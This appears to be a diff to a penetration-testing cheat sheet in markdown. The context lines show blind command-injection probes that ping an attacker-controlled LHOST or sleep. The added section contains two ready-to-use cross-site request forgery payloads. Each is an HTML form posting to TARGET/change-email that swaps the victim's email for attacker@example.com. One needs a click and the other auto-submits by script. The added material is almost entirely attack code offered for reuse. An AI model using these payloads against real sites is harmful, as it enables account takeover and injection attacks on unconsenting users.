@@ -671,3 +671,23 @@ ping -c1 LHOST
 sleep 5
 ping -c 5 127.0.0.1
 ```
+### Cross-Site Request Forgery (CSRF)
+```html
+<!-- Sample where user must click a button -->
+<form action="http://TARGET/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <input type="submit" value="Submit">
+</form>
+```
+
+
+```html
+<!-- Sample that is sent automatically -->
+<form id="csrf" action="http://TARGET/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+
+<script>
+    document.getElementById("csrf").submit();
+</script>
+```
